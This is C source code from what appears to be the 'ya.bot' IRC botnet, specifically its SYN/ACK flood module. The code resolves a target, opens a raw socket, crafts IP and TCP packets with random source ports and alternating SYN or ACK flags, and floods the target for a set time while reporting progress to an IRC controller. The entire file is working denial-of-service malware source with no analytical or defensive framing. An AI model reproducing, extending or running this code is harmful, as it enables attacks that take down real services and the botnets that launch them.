/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_SYNACKFLOOD
DWORD WINAPI synackflood_main(LPVOID param)
{
	bool bFlag = TRUE;
	char szBuffer[60] = {0};
	DWORD dwTime; 
	IPHEADER iphdr;
	PSDHEADER psdhdr;
	sockaddr_in sin;
	SOCKET sock;
	SSYNACKFlood s_saf = *((SSYNACKFlood *)param);
	TCPHEADER tcphdr;

#ifndef NO_DEBUG
		debug_print("SYN/ACK flooding, synackflood_main()");
#endif

	if (!gethostbyname(s_saf.m_szHost))
	{
		if ((!s_saf.m_bSilent) && (s_saf.m_bVerbose))
				irc_message(s_saf.m_bsock, s_saf.m_szAction, s_saf.m_szDestination,
						(char *)string_ddosfailed,
						CRED, string_replyddos, CEND, string_replydotbot);
			thread_remove(THREAD_DDOS);
			return 0;
	}
		sin.sin_addr.s_addr = *(LPDWORD)gethostbyname((char *)s_saf.m_szHost)->h_addr_list[0];
		sin.sin_family = AF_INET;
		sin.sin_port = htons(s_saf.m_nPort);
		sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);
	if (sock == SOCKET_ERROR)
	{
		if ((!s_saf.m_bSilent) && (s_saf.m_bVerbose))
				irc_message(s_saf.m_bsock, s_saf.m_szAction, s_saf.m_szDestination,
						(char *)string_ddosfailed,
						CRED, string_replyddos, CEND, string_replydotbot);
			thread_remove(THREAD_DDOS);
			return 0;
	}
//		setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&bFlag, sizeof(bFlag));
	if (!s_saf.m_bSilent)
			irc_message(s_saf.m_bsock, s_saf.m_szAction, s_saf.m_szDestination,
					(char *)string_ddossynackfloodstarted,
					CGREEN, string_replyddos, CEND, string_replydotbot,
					CBLUE, CEND, s_saf.m_szHost,
					CBLUE, CEND, s_saf.m_nPort,
					CBLUE, CEND, s_saf.m_nDelay,
					CBLUE, CEND, s_saf.m_dwTime);
		dwTime = GetTickCount();
	while (TRUE)
	{
			iphdr.h_verlen = (4 << 4 | sizeof(iphdr) / sizeof(unsigned long));
			iphdr.total_len = htons(sizeof(iphdr) + sizeof(tcphdr));
			iphdr.ident = 1;
			iphdr.frag_and_flags = 0;
			iphdr.ttl = 128;
			iphdr.proto = IPPROTO_TCP;
			iphdr.checksum = 0;
			iphdr.sourceIP = inet_addr(ip_getip(s_saf.m_bsock));
			iphdr.destIP = sin.sin_addr.s_addr;
			tcphdr.th_dport = htons(s_saf.m_nPort);
			tcphdr.th_sport = htons(rand() % 1025);
			tcphdr.th_seq = htonl(0x12345678);
			tcphdr.th_ack = rand() % 3;
		if (rand() % 2 == 0)
				tcphdr.th_flags = SYN;
		else
				tcphdr.th_flags = ACK;
			tcphdr.th_lenres = (sizeof(tcphdr) / 4 << 4 | 0);
			tcphdr.th_win = htons(512);
			tcphdr.th_urp = 0;
			tcphdr.th_sum = 0;
			psdhdr.saddr = iphdr.sourceIP;
			psdhdr.daddr = iphdr.destIP;
			psdhdr.mbz = 0;
			psdhdr.ptcl = IPPROTO_TCP;
			psdhdr.tcpl = htons(sizeof(tcphdr));
			memcpy(szBuffer, &psdhdr, sizeof(psdhdr));
			memcpy(szBuffer + sizeof(psdhdr), &tcphdr, sizeof(tcphdr));
			tcphdr.th_sum = tcpchecksum((USHORT *)szBuffer, sizeof(psdhdr) + sizeof(tcphdr));
			memcpy(szBuffer, &iphdr, sizeof(iphdr));
			memcpy(szBuffer + sizeof(iphdr), &tcphdr, sizeof(tcphdr));
			memset(szBuffer + sizeof(iphdr) + sizeof(tcphdr), 0, 4);
			iphdr.checksum = tcpchecksum((USHORT *)szBuffer, sizeof(iphdr) + sizeof(tcphdr));
			memcpy(szBuffer, &iphdr, sizeof(iphdr));
			sendto(sock,
					(char *)&szBuffer,
					sizeof(szBuffer),
					0,
					(struct sockaddr *)&sin,
					sizeof(sin));
		if ((GetTickCount() - dwTime) >= (s_saf.m_dwTime * 60000))
				break;
			Sleep(s_saf.m_nDelay);

	}
		closesocket(sock);
	if ((!s_saf.m_bSilent) && (s_saf.m_bVerbose))
			irc_message(s_saf.m_bsock, s_saf.m_szAction, s_saf.m_szDestination,
					(char *)string_ddosfinishedflooding,
					CBLUE, string_replyddos, CEND, string_replydotbot,
					CBLUE, CEND, s_saf.m_szHost,
					CBLUE, CEND, s_saf.m_dwTime);
		thread_remove(THREAD_DDOS);
		return 0;

}
#endif